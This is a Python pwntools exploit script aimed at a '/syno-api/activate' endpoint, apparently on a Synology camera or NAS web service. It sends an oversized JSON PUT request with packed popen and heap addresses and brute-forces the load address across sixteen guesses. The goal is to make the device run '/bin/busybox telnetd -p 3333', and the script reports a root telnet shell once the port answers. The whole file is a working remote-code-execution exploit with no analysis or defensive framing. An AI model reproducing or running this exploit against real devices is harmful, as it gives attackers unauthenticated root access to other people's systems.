import requests
import json
import struct
import random
from pwn import *
context.log_level = 'error'
url_base = "http://0.0.0.0:8080"
warnings.filterwarnings("ignore", category=BytesWarning, module="pwnlib")
def check_telnet():
    shell = process("/bin/sh")
    shell.sendline(b"telnet 127.0.0.1 3333")
    sleep(0.2)
    output = shell.recv(100)
    if b"login" in output:
        shell.close()
        return True
    else:
        shell.close()
        return False

endpoint = "/syno-api/activate"
url = url_base + endpoint
headers = {'Content-Type': 'application/json'}

telnet = False
while(telnet == False):
    i = random.randint(0, 15)
    base = 0x400000 + (i * 0x10000)
    popen = struct.pack('<I', base + 0x14D60)[:-1]
    heap = struct.pack('<I', base + 0xC3526)[:-1]
    padding = (0x5000 -0x30) * b"A"


    payload = b'{"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5'
    payload += heap
    payload += b" "
    payload += b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3' 
    payload += popen
    payload += b'":"'
    payload += b'pwn"}'
    payload += b"\x00"
    payload += padding
    payload += b"/bin/busybox telnetd -p 3333"
    print("trying " + hex(base) + " string in heap is at " + hex(base + 0xbe5db))
    try:
        requests.put(url,headers = headers, data = payload)
    except:
        pass
    telnet = check_telnet()
print("shell popped :)")
print("telnet on port 3333, login as root")
